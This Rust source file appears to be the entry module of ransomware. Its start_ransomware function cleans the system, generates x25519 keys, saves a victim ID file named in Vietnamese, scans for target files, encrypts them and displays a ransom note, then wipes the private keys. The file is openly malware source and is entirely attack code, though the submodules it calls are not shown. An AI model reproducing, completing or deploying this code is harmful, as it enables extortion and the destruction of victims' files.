pub mod crypto;
pub mod system;
pub mod scan;
pub mod encrypt;
pub mod note;

use crate::modules::ransomware::{crypto::RansomCrypto, system::clean_system, scan::scan_system, encrypt::encrypt_all, note::show_note};
use std::fs;
use x25519_dalek::PublicKey;

pub fn start_ransomware() {
    println!("Starting Ransomware Module...");

    // 1. Clean System
    clean_system();

    // 2. Generate Keys
    let crypto = RansomCrypto::new();
    
    // 3. Save Victim Public Key (Device ID)
    let victim_pub_hex = hex::encode(crypto.victim_pub.as_bytes());
    let _ = fs::write("ID_CUA_NAN_NHAN.txt", &victim_pub_hex);

    // 4. Scan System
    let targets = scan_system();
    if targets.is_empty() {
        println!("No targets found or filter too strict.");
    } else {
        println!("Found {} target files.", targets.len());
    }

    // 5. Encrypt
    encrypt_all(targets, crypto);

    // 6. Show Note
    show_note(&victim_pub_hex);
    
    // Note: crypto (Private keys) dropped here, zeroized from memory.
    println!("Ransomware finished. Keys wiped.");
}
